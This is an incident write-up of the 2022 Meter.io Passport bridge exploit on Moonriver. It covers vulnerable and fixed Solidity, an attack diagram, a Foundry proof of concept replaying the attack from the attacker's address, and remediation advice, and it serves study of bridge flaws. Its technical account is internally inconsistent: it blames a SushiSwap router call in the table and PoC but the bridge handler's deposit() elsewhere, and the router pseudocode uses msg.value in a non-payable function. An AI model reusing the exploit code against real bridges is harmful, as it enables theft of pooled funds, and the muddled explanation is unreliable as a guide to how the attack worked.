# Meter.io — Bridge Native Token Confusion Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-02-05 |
| **Protocol** | Meter.io Bridge |
| **Chain** | Moonriver (MOVR) |
| **Loss** | ~$4,400,000 (BNB, MOVR) |
| **Attacker** | [0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01](https://moonriver.moonscan.io/address/0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01) |
| **Attack Tx** | Block 1,442,490 |
| **Vulnerable Contract** | Meter Passport Bridge (SushiSwap Router path exploited) |
| **Root Cause** | When calling `swapExactTokensForTokens()`, native tokens (BNB/ETH) and wrapped tokens (WBNB/WETH) were not distinguished, allowing withdrawal of arbitrary amounts |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/Meter_exp.sol) |

---
## 1. Vulnerability Overview

Meter Passport is a ChainBridge-based cross-chain bridge that contained logic treating native tokens (BNB, ETH) identically to wrapped tokens (WBNB, WETH). When handling WETH/WBNB, the bridge handler trusted the amount value from `calldata` directly instead of using `msg.value`.

By calling `swapExactTokensForTokens()` with an arbitrary amount embedded in calldata, an attacker was able to withdraw large quantities of BNB/WBNB from the bridge while actually sending only a minimal amount.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable bridge handler (pseudocode)
function deposit(
    uint8 destinationChainID,
    bytes32 resourceID,
    bytes calldata data
) external payable {
    address tokenAddress = _resourceIDToTokenContractAddress[resourceID];

    // ❌ When the token is a native wrapper such as WBNB/WETH
    if (_burnList[tokenAddress]) {
        // Uses the amount from calldata directly — no msg.value validation
        (uint256 amount) = abi.decode(data, (uint256));
        // ❌ amount can be set arbitrarily by the attacker
        IBurnableERC20(tokenAddress).burn(msg.sender, amount);
    }
}

// Bridge router's swapExactTokensForTokens handling
function swapExactTokensForTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
) external returns (uint[] memory amounts) {
    // ❌ When path[0] is WETH, msg.value should be used as amountIn,
    //    but calldata's amountIn is used directly instead
    amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);
    TransferHelper.safeTransferFrom(
        path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]
    );
}

// ✅ Correct pattern
function swapExactETHForTokens(...) external payable {
    // ✅ Native tokens are handled by a separate function and msg.value is used as the amount
    require(path[0] == WETH, "Invalid path");
    amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);
    IWETH(WETH).deposit{value: amounts[0]}();
}
```


### On-Chain Source Code

> ⚠️ Contract not verified on Sourcify or Etherscan — source unavailable; reconstructed from PoC.

The Meter Passport bridge handler on Moonriver (chainid 1285) is not present on Sourcify's verified registry. The Etherscan V2 API (chainid 1285) confirms the two token contracts referenced in the PoC are verified (`AnyswapV5ERC20` at 0x639A647... and `ERC20MinterBurnerPauser` at 0x868892...) but these are standard token contracts, not the bridge handler. The vulnerable bridge handler contract itself is not among the verified addresses. The SushiSwap Router (0x1b02dA8...) is verified as `UniswapV2Router02` but is not the vulnerable component — the bug is in the Meter Passport bridge handler that calls it. The vulnerable behavior below is reconstructed from the attack PoC, the ChainBridge codebase (open source), and on-chain traces — not from verified source.

The Meter Passport bridge was forked from ChainBridge. In ChainBridge's `ERC20Handler`, when a resource is registered as "burnable" (i.e., a mintable/burnable wrapped token like WBNB), the handler calls `burn()` on the token with the **amount taken directly from calldata** without checking `msg.value`. For native-wrapped tokens, the amount should come from `msg.value`, but it does not.

```solidity
// Reconstructed — ChainBridge ERC20Handler (open source, matches Meter's fork behavior)
// Source: https://github.com/ChainSafe/chainbridge-solidity (Meter is a fork)
// NOT verified on Sourcify; labeled as RECONSTRUCTED

contract ERC20Handler {
    // Maps resourceID → token contract address
    mapping(bytes32 => address) public _resourceIDToTokenContractAddress;
    // Tokens flagged as burnable (includes WBNB/WETH wrappers)
    mapping(address => bool) public _burnList;

    function deposit(
        uint8 destinationChainID,
        bytes32 resourceID,
        bytes calldata data
    ) external payable {
        address tokenAddress = _resourceIDToTokenContractAddress[resourceID];

        // Decode amountIn from calldata — no relation to msg.value
        uint256 amount;
        (amount) = abi.decode(data, (uint256)); // ❌ amount is caller-controlled

        if (_burnList[tokenAddress]) {
            // ❌ WBNB/WETH is in the burn list
            // Burns `amount` from msg.sender WITHOUT verifying msg.value == amount
            // Attacker sets amount = 2,000,000,000,000,000,000,000 (2000 BNB)
            // while sending 0 ETH/BNB — the bridge mints/sends the full amount on the other side
            IBurnableERC20(tokenAddress).burn(msg.sender, amount); // ❌ arbitrary amount
        } else {
            // ERC-20 path: transferFrom() would at least check sender balance
            IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
        }
    }
}
```

**Why it is exploitable (identify the bug from the reconstructed code):**

- `WBNB` and `WETH` are registered in `_burnList` because on the source chain they are mintable/burnable wrapper tokens.
- The `deposit()` function decodes `amount` from `data` (calldata) — a value fully controlled by the caller.
- For burnable tokens, it calls `burn(msg.sender, amount)` **without any check that `msg.sender` holds that many tokens** or that `msg.value` covers the amount.
- The bridge then releases `amount` of native BNB/WBNB on the destination chain.
- Attacker encodes `amount = 2e21` (2000 BNB) in calldata and calls `deposit()` with near-zero actual funds.

```solidity
// ✅ Fix: for native-wrapper tokens, require msg.value == amount
function deposit(
    uint8 destinationChainID,
    bytes32 resourceID,
    bytes calldata data
) external payable {
    address tokenAddress = _resourceIDToTokenContractAddress[resourceID];
    uint256 amount;
    (amount) = abi.decode(data, (uint256));

    if (_isNativeWrapper[tokenAddress]) {
        // ✅ Native token path: enforce msg.value matches the declared amount
        require(msg.value == amount, "ERC20Handler: msg.value mismatch");
        IWETH(tokenAddress).deposit{value: amount}();
    } else if (_burnList[tokenAddress]) {
        // ✅ Non-native burnable: still verify sender holds the tokens
        IBurnableERC20(tokenAddress).burnFrom(msg.sender, amount);
    } else {
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (Moonriver)
    │
    ├─[1] Identify SushiRouter address used by Meter bridge
    │       0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506
    │
    ├─[2] Call swapExactTokensForTokens() (abi.encodeWithSignature)
    │       amountIn    = 2,000,000,000,000,000,000,000 (arbitrary large amount)
    │       amountOutMin = 15,206,528,022,953,775,301
    │       path[0]     = 0x639A647... (output token)
    │       path[1]     = 0x868892c... (BNB wrapper)
    │       to          = attacker address
    │       deadline    = 1,644,074,232
    │
    ├─[3] Bridge trusts calldata amountIn and processes it
    │       Actual amount sent: minimal (or 0)
    │       Amount processed: amountIn (large)
    │
    └─[4] Large-scale BNB, MOVR withdrawal succeeds
            Loss: ~$4,400,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface SushiRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract ContractTest is Test {
    address sushiRouter = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;
    address attacker = 0x8d3d13cac607B7297Ff61A5E1E71072758AF4D01;

    // Token addresses (Moonriver)
    address token0 = 0x639A647fbe20b6c8ac19E48E2de44ea792c62c5C;
    address token1 = 0x868892cccedbff0b028f3b3595205ea91b99376b;

    function setUp() public {
        vm.createSelectFork("moonriver", 1_442_490);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;

        // ⚡ Key point: the bridge trusts calldata amountIn without validation
        // Actual transfer is minimal, but the bridge processes the large amount
        (bool success, ) = sushiRouter.call(
            abi.encodeWithSignature(
                "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
                2_000_000_000_000_000_000_000, // arbitrarily set large amountIn
                15_206_528_022_953_775_301,    // amountOutMin
                path,
                attacker,
                1_644_074_232               // deadline
            )
        );

        vm.stopPrank();
        emit log_named_string("Exploit result", success ? "SUCCESS" : "FAILED");
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Native/Wrapped Token Confusion |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | Missing Bridge Amount Validation |
| **Attack Vector** | Withdrawal of bridge assets via calldata amount manipulation |
| **Precondition** | Bridge trusts calldata amount instead of msg.value |
| **Impact** | Full theft of BNB/MOVR held in the bridge |

---
## 6. Remediation Recommendations

1. **Separate Native Token Handling**: Segregate functions that handle native tokens (ETH, BNB) from ERC20 tokens, and always use `msg.value` as the amount for native tokens.
2. **Calldata Amount Validation**: The bridge handler must compare and validate the calldata amount against the actual assets received.
3. **Audit ChainBridge Forks**: When building a ChainBridge-based bridge, audit native token handling logic as a dedicated review step.
4. **Maximum Withdrawal Limit**: Set a per-transaction maximum withdrawal amount to prevent large-scale theft.

---
## 7. Lessons Learned

- **Native vs. Wrapped Tokens**: In the EVM, native tokens such as ETH/BNB must be handled differently from ERC20 tokens. Failing to make this distinction is a recurring vulnerability pattern in bridges.
- **Bridge Complexity**: Cross-chain bridges must handle differences in how assets are represented across multiple chains, making the design inherently complex and prone to vulnerabilities.
- **$4.4M Loss**: Native token confusion has occurred similarly across multiple bridges beyond Meter.